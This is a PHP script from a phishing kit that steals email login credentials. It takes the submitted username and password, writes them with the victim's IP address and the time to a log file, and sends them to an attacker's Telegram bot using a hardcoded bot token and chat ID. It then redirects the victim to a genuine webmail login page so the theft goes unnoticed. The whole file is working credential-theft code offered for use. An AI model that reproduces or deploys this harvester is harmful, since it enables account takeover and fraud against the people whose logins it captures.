<?php

$email = $_POST['username'];
$Password= $_POST['password'];


$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];

$tn = 'info@erasmus-garage.lat'; /////////////// info@erasmus-garage.lat \\\\\\\\\\\\\\\\

$telegram = "on";
{
	
$JarJar = "+---------[Work LoGz]----------+
+ Email    : $email
+ Password : $Password
+-----------[ Info ]-----------+
+ Client IP : http://www.geoiptool.com/?IP=$ip
+ Date Log  : $date
+ Time Log  : $time
+---------[Anyi^]----------+";
$file = fopen("logs.txt","a");  
fwrite($file,$JarJar);
$subject = "PDF Auto";
$headers = "From: Anyi-BABA info";
$headers .= "MIME-Version: 1.0\n";
}

$txt = $JarJar;
$chat_id = "6472534792"; // Your Telegram Chat ID
$bot_url = "8354357255:AAFeXiGJlqLoZBrZVy55VQ3hgJ6B4VJxTgM"; //Your Telegram Bot Api Key

if ($telegram == "on"){
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

header("Location: https://webmail.westnet.com.au/login");
?>